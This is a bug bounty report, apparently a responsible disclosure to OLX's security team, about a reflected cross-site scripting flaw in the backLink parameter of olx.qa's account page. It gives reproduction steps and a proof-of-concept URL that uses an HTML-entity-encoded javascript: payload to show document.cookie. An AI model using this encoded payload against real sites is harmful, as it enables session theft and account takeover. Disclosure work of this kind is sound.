
**Hi Team Security @olx** 

I Found [Reflected XSS](https://www.netsparker.com/blog/web-security/cross-site-scripting-xss/) in https://olx.qa via parameter `backLink` on **/m/account/**

####Information
- **Reflected XSS** : a reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored. This means that an attacker has to send a crafted link or post form to the victim to insert the payload, and the victim should click the link. This kind of payload is also generally being caught by built in browser XSS filters, like in FireFox,Chrome, Internet Explorer or Edge.

####Detail
When I tried test page login in path **/m/account/** I was able injection path url via parameter `backLink` by **HTML entity**

**Steps to Verify**

- Go to https://olx.qa/m/account/
- login as user 
- logout [ catch parameter `backLink` ]
- Injection payload xss encoded by **HTML entity**
- Click button back 

**XSS executed** 
 
**POC URL**
~~~
https://olx.qa//m/account/?backLink=%26%2302java%26%23115cript:alert(document.cookie);//&ref[0][action]=ads&ref[0][category]=9&ref[0][city]=66&ref[0][method]=index&ref[0][params][page]=2&ref[0][region]=20&ref[0][subregion]=20&ref[1][action]=myaccount&ref[1][ajax]=&ref[1][method]=index&ref[1][params][ref][0][action]=ads&ref[1][params][ref][0][category]=9&ref[1][params][ref][0][city]=66&ref[1][params][ref][0][method]=index&ref[1][params][ref][0][params][page]=2&ref[1][params][ref][0][region]=20&ref[1][params][ref][0][subregion]=20
~~~

**POC Image**

{F143725}


**Tested**
- FireFox 


**Severity**
`High` dependence on Team [Mozilla Security Severity Ratings](https://wiki.mozilla.org/Security_Severity_Ratings)

**Reference**
- https://www.netsparker.com/blog/web-security/cross-site-scripting-xss/ 
- http://brutelogic.com.br/blog/chrome-xss-bypass/ 
- http://www.upenn.edu/computing/security/swat/SWAT_Top_Ten_A4.php
- https://wiki.mozilla.org/Security_Severity_Ratings


**Best Regards**
Hussain Adnan
